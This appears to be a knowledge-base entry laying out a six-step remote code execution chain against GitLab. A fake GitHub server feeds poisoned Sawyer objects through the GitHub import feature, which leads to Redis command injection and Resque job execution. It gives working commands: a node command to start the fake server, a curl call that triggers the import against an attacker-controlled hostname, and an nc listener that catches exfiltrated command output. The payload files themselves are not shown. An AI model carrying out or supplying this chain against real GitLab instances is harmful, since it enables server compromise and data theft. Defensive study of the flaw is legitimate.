---
id: ac-gitlab-rce-github-import
name: GitLab RCE via Malicious GitHub Import and Redis Command Injection
type: attack_chain
description: >-
  Multi-stage attack exploiting GitLab's GitHub import feature to inject
  arbitrary Redis commands, leading to remote code execution on the GitLab
  server via poisoned Sawyer objects and Resque queue manipulation.
verified: false
submitted: true
step_count: 6
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:24:14.411Z'
procedures:
  - '[[procedures/Set-Up-Prerequisites-for-GitLab-Exploit]]'
  - '[[procedures/Prepare-Dummy-GitHub-Server-with-Malicious-Payloads]]'
  - '[[procedures/Run-Dummy-GitHub-Server]]'
  - '[[procedures/Trigger-GitHub-Import-via-API]]'
  - '[[procedures/Exploit-Redis-Injection-for-RCE]]'
  - '[[procedures/Verify-Exploitation-and-Capture-Output]]'
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
tags:
  - rce
  - redis-injection
  - gitlab
  - github-import
  - sawyer
  - octokit
  - resque
platforms:
  - Web
  - Linux
tools:
  - '[[tools/Node.js]]'
  - '[[tools/curl]]'
  - '[[tools/nc]]'
  - '[[tools/irb]]'
validated: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
---

# GitLab RCE via Malicious GitHub Import and Redis Command Injection

Multi-stage attack chain demonstrating a complete workflow to achieve remote code execution on a GitLab server by exploiting the GitHub import feature. The attack leverages a fake GitHub server to deliver poisoned responses that inject Redis commands through nested hashes in Sawyer::Resource objects, ultimately leading to Resque queue manipulation and system command execution.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 6 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Setup Prerequisites] --> B[Prepare Fake Server]
    B --> C[Run Fake Server]
    C --> D[Trigger Import]
    D --> E[Inject Redis Commands]
    E --> F[Verify RCE]

    style A fill:#e74c3c
    style B fill:#e74c3c
    style C fill:#f39c12
    style D fill:#f39c12
    style E fill:#3498db
    style F fill:#27ae60
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Node.js]]
- [[tools/curl]]
- [[tools/nc]]
- [[tools/irb]]

### Target Environment

- GitLab instance (self-hosted or gitlab.com) with GitHub import enabled
- Redis service running on GitLab server (default port 6379)
- Publicly accessible attacker machine with IP and ports open (e.g., 80 for HTTP, 11211 for nc listener)
- Network access to GitLab API

### Initial Access Requirements

- GitLab personal access token with 'api' scope
- Fake GitHub personal access token (arbitrary, as it's not validated against real GitHub)
- Attacker-controlled VM or server for hosting fake GitHub API

## Detailed Attack Procedures

### Step 1: Set Up Prerequisites
procedure: [[procedures/Set-Up-Prerequisites-for-GitLab-Exploit]]

**Objective**: Prepare the environment, including creating necessary tokens and setting up the attacker machine.

**Instructions**: Generate a GitLab API token and ensure the attacker machine has a public IP accessible by the GitLab instance. Install Node.js if not present.

**Expected Output**: Valid GitLab token and ready attacker machine.

**Success Indicators**:
- GitLab token created successfully
- Node.js installed and accessible

### Step 2: Prepare Dummy GitHub Server
procedure: [[procedures/Prepare-Dummy-GitHub-Server-with-Malicious-Payloads]]

**Objective**: Decompress and configure the fake server with malicious payloads targeting Sawyer object poisoning.

**Instructions**: Extract the provided archive and edit the Redis command file to include RCE gadgets like LPUSH to Resque queues.

**Expected Output**: Configured dummy server files with poisoned responses.

**Success Indicators**:
- Malicious payloads embedded in response files
- Redis command file updated with RCE injection

### Step 3: Run Dummy Server
procedure: [[procedures/Run-Dummy-GitHub-Server]]

**Objective**: Start the Node.js server to mimic GitHub API and serve poisoned repository data.

**Instructions**: Execute [[commands/node-start-fake-server]] to launch the server on the attacker's IP and port.

```bash
node ./index.js YOUR_IP YOUR_PORT
```

**Expected Output**: Server listening and ready to respond to GitLab queries.

**Success Indicators**:
- Console output shows server started
- Port listening confirmed

### Step 4: Trigger GitHub Import
procedure: [[procedures/Trigger-GitHub-Import-via-API]]

**Objective**: Initiate the import process via GitLab API, directing it to query the fake server.

**Instructions**: Use [[commands/curl-trigger-import]] to POST to the import endpoint with the fake GitHub hostname.

```bash
curl -kv "http://gitlab.example.com/api/v4/import/github" --request POST --header "content-type: application/json" --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" --data '{"personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", "repo_id": "356289002", "target_namespace": "YOUR_GITLAB_USERNAME", "new_name": "poc-rce", "github_hostname": "http://YOUR_IP:YOUR_PORT"}'
```

**Expected Output**: Import request accepted, triggering queries to fake server.

**Success Indicators**:
- HTTP 200 or 201 response from GitLab
- Fake server logs incoming requests

### Step 5: Exploit Redis Injection
procedure: [[procedures/Exploit-Redis-Injection-for-RCE]]

**Objective**: Leverage the poisoned response to inject Redis commands, escalating to RCE via queue jobs.

**Instructions**: The injection happens automatically via the fake response; monitor for Redis protocol elements appended during cache key construction. Use commands like [[commands/redis-lpush-rce-gadget]] if direct access, but primary injection is via Sawyer to_s/bytesize manipulation.

**Expected Output**: Malicious jobs pushed to Resque queues, executing system commands.

**Success Indicators**:
- Redis replication or job injection confirmed
- System commands like 'hostname; ps aux' executed

### Step 6: Verify Exploitation
procedure: [[procedures/Verify-Exploitation-and-Capture-Output]]

**Objective**: Capture and confirm RCE output from the target server.

**Instructions**: Run [[commands/nc-listen-for-output]] to listen for command results or replication pings. Check files like /tmp/ahihi on local setups.

```bash
nc -vlkp 11211
```

**Expected Output**: Incoming connections with command output or pings.

**Success Indicators**:
- nc receives data from GitLab server
- 500 errors observed on gitlab.com due to cache poisoning
- File output visible on local GitLab

## Attack Chain Summary

### Key Achievements

1. Successful poisoning of Sawyer::Resource objects during GitHub import
2. Arbitrary Redis command injection leading to replication and queue manipulation
3. Remote code execution via Resque gadgets executing system commands

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application
- [[Command-Line Interface]] Command and Scripting Interpreter

### MITRE ATT&CK Tactics

- [[Initial Access]] Initial Access
- [[Execution]] Execution

---
*Last updated: 2023-10-01T00:00:00Z*
